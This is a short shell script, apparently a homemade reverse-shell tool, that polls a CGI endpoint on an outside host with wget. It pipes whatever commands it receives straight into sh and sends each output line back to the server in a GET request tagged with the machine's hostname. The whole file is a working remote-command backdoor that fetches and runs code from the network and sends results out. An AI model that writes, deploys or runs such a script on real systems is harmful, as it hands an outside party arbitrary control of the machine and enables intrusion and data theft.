## TODO: Output should be clumped together, not one request per line
##       Could we use HTML upload instead of post/get?
SERVER="hwi.ath.cx"
CGIPATH="/cgi-bin/joey/revssh"
URL="http://$SERVER/$CGIPATH"

SESSID=`hostname`"_$$"

COM="wget -O -"
# COM="lynx -source"
# COM="telnetget ..."

$COM "$URL?sessid=$SESSID&init=true" |

sh 2>&1 |

while read LINE; do
	$COM "$URL?sessid=$SESSID&output=$LINE"
done
